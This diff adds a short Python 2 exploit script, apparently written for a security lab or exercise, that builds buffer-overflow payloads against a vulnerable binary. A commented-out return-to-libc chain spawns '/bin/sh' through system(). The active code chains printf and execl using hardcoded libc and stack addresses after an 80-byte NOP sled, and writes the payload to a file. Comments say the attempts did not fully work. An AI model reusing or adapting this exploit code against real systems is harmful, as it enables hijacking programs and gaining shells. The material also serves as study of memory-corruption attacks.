@@ -1,0 +1,58 @@
+from struct import pack
+
+
+
+#/***************************************/
+
+
+#STANDARD RETURN TO LIBC
+
+
+#****************************************/
+
+#offset = 0x50
+#addrSystem = pack("I", 0xb7e51280) #GDB p system
+##pad = "\x90" * 80 #+ "\xc0\xf1\xff\xbf"
+#cmd = "/bin/sh;#"
+#pad = "J" * (offset - len(cmd))
+#binSH = pack("I", 0xb7f79c18)    #USE FIND IN GDB http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html
+#exit = pack("I", 0xb7e43820) # GDB p exit
+#arg2 = "\xf0\xff\xff\xff" #EXIT ARGUMENT
+#payload = cmd + pad + addrSystem + exit + binSH + arg2
+
+#Standard ret 2 libc unfortunately did not work fully
+#New approach using execl
+
+
+#GET ENIRONMENT VAIRABLE NAME
+# x/100s **(char***)&environ
+
+
+#/**********************************
+
+#Hackers hut execl approach
+#Doesnt work due to variable environment
+#cool none the less
+
+#**********************************/
+
+printAdd = pack("I", 0xb7e5e7f0)
+execlAdd = pack("I", 0xb7ecae50)
+
+#ENVIRONEMENT VARIABLES
+
+fav = pack("I", 0xbffffcb7)
+formt = pack("I", 0xbffff450)
+
+bufferAdd = pack("I", 0xbffff15c)
+
+#| buffer (80) | printf | execl | formatstring | prg | prg | here |
+
+pad = "\x90" * 80
+
+payload = pad + printAdd + execlAdd + formt + fav + fav + bufferAdd
+
+file("cat", "w").write(payload)
+
+#HACKERS HUT
+#http://www.win.tue.nl/~aeb/linux/hh/hh-10.html
